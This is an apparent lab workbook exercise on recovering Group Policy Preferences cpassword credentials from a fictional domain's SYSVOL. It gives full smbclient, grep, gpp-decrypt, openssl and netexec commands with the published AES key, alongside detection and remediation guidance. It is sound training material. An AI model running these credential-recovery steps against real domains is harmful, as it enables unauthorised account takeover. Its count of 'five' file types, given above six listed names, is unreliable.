    Exercise 2.2: SYSVOL Skeletons

    Before You Begin

    In 2014 Microsoft released MS14-025, which removed the ability for Group Policy Preferences (GPP) to deploy local credentials with a cpassword attribute. The patch did not remove or rewrite the cpassword entries that already lived in SYSVOL. SYSVOL replicates to every domain controller, every DC backs it up, every backup ages into archives. Twelve years later you still find decryptable GPP cpassword blobs in production directories. Exercise 2.2 walks you through finding one in Nordport's SYSVOL, decrypting it with the published Microsoft AES key, and using the recovered credential.

    Tools required: smbclient, gpp-decrypt, openssl (fallback decryption), netexec. All are pre-installed on Kali.

    Scenario

    Marcus Bell: "MS14-025 patched the creation of new GPP cpassword entries twelve years ago. It did not delete the old ones. SYSVOL is replicated to every DC, so every leak persists forever unless someone goes looking. Find Nordport's. Decrypt it. The recovered credential is yours."

    Your scope token (OCR_SCOPE_TOKEN) tells you which one of the per-token GPP entries belongs to you. Decrypting it yields the password for svc_gpp_<token>. That account has read access to a per-token directory under the \\corp-dc01\GPPFlags\ share. The flag lives in FLAG.txt inside your directory.

    Credentials:

    Username Password Purpose
    j.chen Welcome2026# Read SYSVOL

    Domain: corp.nordport.local Domain controller: corp-dc01

    Your Objectives

    • Mount and recursively download SYSVOL with j.chen credentials
    • Locate a Group Policy Preferences XML file containing cpassword
    • Decrypt the per-token cpassword for your account
    • Authenticate as svc_gpp_<token> with the recovered password
    • Read \\corp-dc01\GPPFlags\<token>\FLAG.txt and submit the flag

    cpassword Decryption Pipeline

    The decryption is mechanical once you have the ciphertext. The diagram below traces a single cpassword from XML attribute to plaintext.

    Background: GPP, cpassword, and the Public AES Key

    Group Policy Preferences (GPP) extended Group Policy in Windows Server 2008 with a way for administrators to deploy local users, scheduled tasks, mapped drives, services, and data sources to client machines. To support credential deployment (such as creating a local administrator account with a fixed password on every workstation), GPP introduced an XML schema that included an encrypted cpassword attribute.

    The encryption was AES-256 in CBC mode, with an all-zero IV, and a key that Microsoft published in their own MSDN documentation as a reference for compatibility. The intent was that the encryption obfuscated the password from casual filesystem readers; in practice anyone who read MSDN could decrypt it.

    The published key

    4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b

    The 32-byte AES-256 key (IV is 16 zero bytes). The plaintext is the password encoded as UTF-16 LE. The ciphertext is base64-encoded with optional trailing = padding stripped.

    The XML files that may contain cpassword

    File Purpose
    Groups.xml Local user / group deployment
    Services.xml Service account definition
    ScheduledTasks.xml Scheduled task credential
    DataSources.xml ODBC connection string credential
    Drives.xml Mapped drive credential
    Printers.xml Printer share credential

    Any of these may contain a cpassword="..." attribute. They live under \\<domain>\SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\<Type>\.

    The patch and what it did not do

    MS14-025 removed the GUI affordances that let administrators create new cpassword entries through gpedit.msc. Existing entries continue to work because client-side processing of GPP is unchanged. Microsoft's official guidance is to manually delete every cpassword-bearing XML from SYSVOL after rotating the leaked passwords. Most organizations did the rotation; very few did the deletion. The artifact is consequently one of the most reliable findings in any internal pentest of an AD older than ~2014.

    Tool Primer

    gpp-decrypt

    A Ruby one-liner shipped on Kali that does AES-256 CBC decryption with the published key.

    gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'

    Output is the plaintext password.

    smbclient mass-download of SYSVOL

    smbclient //corp-dc01/SYSVOL -U "CORP\j.chen%Welcome2026#" \
  -c "recurse on; prompt off; mget *"

    Downloads the full SYSVOL tree to your current working directory.

    grep + find for SYSVOL inspection

    grep -rE 'cpassword="[^"]+"' SYSVOL/

    Returns every line containing a cpassword attribute across the dump.

    Manual openssl decryption (if gpp-decrypt is missing)

    echo -n '<base64-cipher>=' | openssl enc -d -aes-256-cbc \
  -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \
  -iv 00000000000000000000000000000000 -base64 | iconv -f UTF-16LE -t UTF-8

    The = padding restoration matters. GPP strips trailing =; openssl needs them. Pad the base64 string until its length is a multiple of 4.

    Walkthrough

    Step 1: Confirm Your Scope Token

    The platform injects your scope token as OCR_SCOPE_TOKEN. Workbook commands reference ${OCR_SCOPE_TOKEN} directly so you can paste them as-is. Make sure the variable is set first.

    Kali - Confirm scope token

    echo "$OCR_SCOPE_TOKEN"

    Should print a 4-character lowercase string (e.g. j001). If empty, export OCR_SCOPE_TOKEN=<your_token> from the lab dashboard banner.

    Step 2: Mirror SYSVOL Locally

    SYSVOL is the replicated GPO/script share served by every DC. Reading it is normal: every domain-joined machine pulls SYSVOL on every Group Policy refresh, so SYSVOL reads do not get logged or alerted on by default. Mirror the entire tree to local disk in one shot, then grep at leisure.

    Kali - Pull the entire SYSVOL share to disk

    mkdir -p ~/work/adpt-2-02 && cd ~/work/adpt-2-02
smbclient //corp-dc01/SYSVOL -U "CORP\j.chen%Welcome2026#" \
  -c "recurse on; prompt off; mget *"

    What each piece does:

    • mkdir -p ~/work/adpt-2-02 && cd ... create a working directory and switch to it. mkdir -p does not error if it already exists. && runs the second command only if the first succeeded.
    • smbclient //corp-dc01/SYSVOL UNC path to the SYSVOL share. SYSVOL is a default share on every DC; j.chen (any authenticated domain user) has read access by design.
    • -U "CORP\j.chen%Welcome2026#" credential bundle.
    • -c "recurse on; prompt off; mget *" non-interactive command list:
      • recurse on recurse into subdirectories on subsequent operations.
      • prompt off do not ask for confirmation per-file (without this, mget prompts before each download).
      • mget * download every file in the current directory and (with recurse on) every subdirectory.

    The download takes seconds. SYSVOL on a freshly built domain is a few MB; on a real production domain expect tens to hundreds of MB.

    Step 3: Hunt for cpassword

    The whole tree is now in your local CWD. Grep recursively for the cpassword= attribute. Note: this is one of those rare cases where grep on local files is faster + safer than grep over SMB (no rate limit, no audit footprint after the initial mirror).

    Kali - Find every cpassword attribute

    grep -rE 'cpassword="[^"]+"' . | head -20

    What each option does:

    Flag Effect
    -r Recurse into subdirectories.
    -E Extended regex (so [^"]+ works without escaping).
    'cpassword="[^"]+"' Match the literal cpassword="...something not a quote...". The [^"]+ greedy-matches up to the closing quote.
    . Search starting from current directory.
    \| head -20 Cap at 20 matches; production SYSVOLs sometimes have many.

    On Nordport's SYSVOL you will find a Groups.xml under the Default Domain Policy GUID ({31B2F340-016D-11D2-945F-00C04FB984F9}) containing one User entry per scope token. Each User node has a name="svc_gpp_<token>" and a cpassword="...".

    Step 4: Filter to Your Token

    Each student has a per-token User entry in the same Groups.xml. Extract just yours.

    Kali - Pull just your User entry

    grep -A1 -E "name=\"svc_gpp_${OCR_SCOPE_TOKEN}\"" \
  ./corp.nordport.local/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/Machine/Preferences/Groups/Groups.xml

    What each piece does:

    • -A1 print 1 line of context AFTER each match. The XML is structured so the <Properties cpassword="..."> line follows the <User name="..."> line.
    • -E extended regex; needed for the escaped double-quote class.
    • The XML path: SYSVOL contents under each domain are organized as <domain>/Policies/<GPO-GUID>/Machine/Preferences/<type>/<type>.xml. The Default Domain Policy GUID is the constant {31B2F340-016D-11D2-945F-00C04FB984F9} (the same on every domain).
    • The braces in the path need backslash-escaping in bash because {...} is brace expansion syntax.

    The output shows the <User ...> line and the next line containing the Properties element with the cpassword. Extract the cpassword value.

    A more surgical extract that returns ONLY the cpassword string:

    Kali - One-liner to get just your cpassword string

    XML=./corp.nordport.local/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/Machine/Preferences/Groups/Groups.xml
grep -E "userName=\"svc_gpp_${OCR_SCOPE_TOKEN}\"" "$XML" \
  | grep -oE 'cpassword="[^"]+"' | head -1

    What each piece does:

    • XML=... shell variable holding the file path. Saves typing the long path twice.
    • First grep -E "userName=...\"$OCR_SCOPE_TOKEN\"" filter to lines mentioning your specific user.
    • Pipe to grep -oE 'cpassword="[^"]+"':
      • -o only print the matched substring.
      • -E extended regex.
      • The pattern matches cpassword="..." literal.
    • | head -1 take only the first match (defensive; should be exactly one).

    Step 5: Decrypt

    gpp-decrypt is a small Ruby tool shipped on Kali. It hardcodes the published Microsoft AES-256 key and the all-zero IV, so it requires no arguments other than the cpassword.

    Kali - Decrypt with gpp-decrypt

    gpp-decrypt '<paste your cpassword value here>'

    What this does:

    • Takes the base64-encoded ciphertext as the only argument.
    • Restores the trailing = padding that GPP strips.
    • AES-256-CBC decrypts using the published key (4e9906e8fcb66cc9...).
    • Strips PKCS7 padding from the plaintext.
    • Decodes the resulting bytes as UTF-16 LE (Windows passwords are stored UTF-16 LE internally).

    The output is the plaintext password for svc_gpp_<token>. If the cpassword has unusual characters or the tool errors, fall back to manual openssl: echo -n '<cpassword>=' | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 00000000000000000000000000000000 -base64 | iconv -f UTF-16LE -t UTF-8.

    Step 6: Authenticate as the Recovered Account

    Confirm the cracked credential works against the DC. Validating before using it for the actual share read tells you the decryption worked AND the account is enabled.

    Kali - Validate svc_gpp_

    netexec smb corp-dc01 -u "svc_gpp_${OCR_SCOPE_TOKEN}" -p '<recovered password>' \
  -d corp.nordport.local

    Same netexec auth check pattern from earlier exercises: [+] means success, [-] with STATUS_LOGON_FAILURE means the password is wrong (probably a copy-paste issue with the cpassword), [-] with STATUS_ACCOUNT_DISABLED means the account exists but is disabled.

    Step 7: Read the Token-Scoped Flag

    The recovered svc_gpp account has read access to a per-token directory under the \\corp-dc01\GPPFlags\ share. The directory ACL grants read ONLY to the matching svc_gpp account (and Domain Admins / SYSTEM); other students' svc_gpp accounts cannot read your directory.

    Kali - Pull the flag file from your scoped directory

    smbclient "//corp-dc01/GPPFlags" \
  -U "CORP\\svc_gpp_${OCR_SCOPE_TOKEN}%<recovered password>" \
  -c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt"
cat FLAG.txt

    What each piece does:

    • //corp-dc01/GPPFlags UNC path to the per-exercise share (created by setup-adpt-dc.ps1).
    • -U "CORP\\svc_gpp_${OCR_SCOPE_TOKEN}%..." authenticate as the recovered account, NOT as j.chen. The double-backslash inside double-quotes escapes to a single backslash for smbclient's parser.
    • -c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt" non-interactive: cd into the per-token subdirectory, then download the flag file.
    • cat FLAG.txt print the contents.

    The file holds a flag string in the form OCR{...}. Submit it on the platform.

    Blue Team Perspective

    Reading SYSVOL is normal client behavior; every domain-joined computer reads it on every Group Policy refresh. The detection signals therefore have to be more nuanced than "file was read".

    Activity Event ID Where it fires
    SYSVOL share access from Kali 5140 (network share access) DC Security log
    Recursive directory traversal 4663 burst DC Security log (if object access auditing on SYSVOL)
    GPP XML containing cpassword Custom SIEM rule on file content File integrity monitor
    Service account login from new IP 4624 logon type 3 Target server Security log

    What SOCs typically catch

    Few defenders monitor reads on SYSVOL because GPO refreshes generate baseline noise. The detection that does work is on the use of the recovered credential: a service account never logs on interactively, and any 4624 logon for svc_gpp_* outside its expected hosts is a strong indicator. File integrity monitoring on SYSVOL with a regex match for cpassword=" flags the artifact for the blue team's quarterly hunt list.

    Hardening Note

    The remediation order matters: rotate first, then delete. Deleting the XML before rotating leaves every machine that consumed the policy with the old password still active.

    GPP cpassword remediation steps

    • Rotate the password of every account referenced in a GPP XML on every host that may have applied the policy.
    • Edit each offending GPO via GPMC and remove the GPP entry through the UI; verify the resulting XML no longer contains cpassword.
    • Run dfsrdiag replicationstate on every DC to confirm the deletion replicated.
    • Migrate local-admin password management to LAPS / Windows LAPS; service-account use to gMSAs.
    • Add a SIEM detection: file integrity monitor on SYSVOL\**\Preferences\**\*.xml matching cpassword=".
    • Audit older backups; expired credentials in restored snapshots are still useful to an attacker who can read the snapshot.

    Analysis Questions

    1. Microsoft published the GPP AES key in MSDN. Why? And what does that decision tell you about the company's threat model at the time?

    Reveal Answer

    Microsoft published the key as part of the GPP reference documentation so third-party tooling could read and write the same XML format. The threat model assumed the security boundary lived above the SYSVOL filesystem: only authenticated domain users could read SYSVOL, and authenticated domain users were considered trusted enough to know local admin passwords. That assumption broke the moment any authenticated domain user was untrusted (compromised account, contractor, intern). The episode is a textbook case of confusing "obfuscation" with "encryption." Real encryption requires that knowing the algorithm and ciphertext does not yield the plaintext without a secret. Publishing the key inverted that. Modern Group Policy alternatives (LAPS for local admin, gMSAs for service accounts) keep the secret out of SYSVOL entirely.

    2. SYSVOL replicates between DCs. If a defender deletes the offending Groups.xml on one DC, what could go wrong, and how should the deletion be done correctly?

    Reveal Answer

    SYSVOL replicates via DFS-R (or the older FRS on legacy domains). Deleting a file on one DC normally propagates the deletion to every other DC. Two failure modes appear: (a) DFS-R replication backlogs hide deletions for hours or days during which the file is still readable on lagging DCs; (b) some operators delete the GPP XML on the file system but not the corresponding GPO container, leaving an orphaned policy that GPMC reports as broken. The correct procedure is to use Group Policy Management Console to edit the GPO and remove the GPP entry through the UI (which writes a clean XML without the cpassword and increments the GPO version number), then verify replication on every DC with repadmin /showrepl and dfsrdiag replicationstate. After that, rotate the leaked password on every machine that may have used it. Deletion alone is not sufficient because backups and snapshots may still contain the original.

    3. The published key is for AES-256-CBC with a zero IV and UTF-16LE plaintext. Walk through the decryption math at the byte level.

    Reveal Answer
    1. Take the base64 ciphertext, restore trailing = padding to a length that is a multiple of 4, base64-decode to raw bytes. 2. Initialize an AES-256-CBC decryptor with the 32-byte key (4e9906...) and a 16-byte zero IV. 3. Decrypt the ciphertext, yielding plaintext bytes plus PKCS7 padding. 4. Strip PKCS7 padding (the last byte tells you how many padding bytes to strip; verify each padding byte equals that count). 5. Decode the remaining bytes as UTF-16 LE (every printable ASCII character takes two bytes, with the high byte being zero). 6. The resulting string is the plaintext password. The reason UTF-16 LE is used is that Windows internally stores user passwords as UTF-16 LE Unicode strings; GPP simply round-trips the same encoding through AES.

    Key Takeaways

    • The GPP AES key is public; any cpassword in any reachable SYSVOL is plaintext to anyone who can read the file.
    • Five XML schemas may contain cpassword: Groups, Services, ScheduledTasks, DataSources, Drives, Printers. Search them all.
    • SYSVOL is readable by any authenticated domain user, so the bar for triggering this finding is low.
    • Deletion of cpassword entries is not enough; rotate every leaked credential on every machine that used it.
    • Modern alternatives (LAPS for local admin, gMSAs for service accounts) keep the secret off SYSVOL entirely.

    Cheat Sheet Recap

    The four operations below cover the entire find-decrypt-use loop. Pin this card; SYSVOL is the cheapest finding in any internal pentest of a long-lived AD.

    Goal Command
    Mirror SYSVOL locally smbclient //<dc>/SYSVOL -U "<DOMAIN>\<user>%<pw>" -c "recurse on; prompt off; mget *"
    Hunt cpassword strings grep -rE 'cpassword="[^"]+"' .
    Decrypt a cpassword gpp-decrypt '<base64-cipher>'
    Validate the recovered cred netexec smb <dc> -u <recovered-user> -p '<plain>' -d <domain>

    Card 1: GPP cpassword Decryption

    Q: What command decrypts a GPP cpassword string j1Uyj3Vx... on Kali, and what is the underlying algorithm?

    Answer 
    gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'

    Algorithm: AES-256-CBC with the published 32-byte key starting 4e9906e8fcb66cc9..., 16-byte zero IV, plaintext encoded as UTF-16 LE, ciphertext base64 with stripped trailing padding.

    Card 2: cpassword File Locations

    Q: Name five XML file types in SYSVOL that may contain a cpassword attribute.

    Answer

    Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml, Drives.xml, Printers.xml. All under \\<domain>\SYSVOL\<domain>\Policies\<GUID>\Machine\Preferences\<Type>\. Always grep for cpassword=" recursively rather than guessing which file type the operator used.

    Card 3: SYSVOL Mirror in One Command

    Q: Write the smbclient command to recursively download all of SYSVOL from corp-dc01 as j.smith / Pass#.

    Answer 
    smbclient //corp-dc01/SYSVOL -U "CORP\j.smith%Pass#" \
  -c "recurse on; prompt off; mget *"

    Run from an empty working directory; the entire SYSVOL tree mirrors below your CWD. SYSVOL is typically only a few MB on a small domain.

    Card 4: MS14-025

    Q: What did MS14-025 do, and what did it explicitly NOT do?

    Answer

    It removed the GUI affordances that let administrators create new GPP cpassword entries through gpedit.msc. It did NOT delete or rewrite existing entries already in SYSVOL, did NOT rotate any leaked passwords, and did NOT change client-side GPP processing (so old entries still apply policy). The artifact survives indefinitely until an administrator manually removes the entries and rotates the passwords.

    Card 5: openssl Fallback Decryption

    Q: If gpp-decrypt is missing, write the openssl command to decrypt a GPP cpassword.

    Answer 
    echo -n '<base64+padding>' | openssl enc -d -aes-256-cbc \
  -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \
  -iv 00000000000000000000000000000000 -base64 | iconv -f UTF-16LE -t UTF-8

    Restore the = padding to a multiple of 4 first. The iconv step converts the UTF-16 LE plaintext back to UTF-8 for terminal display.
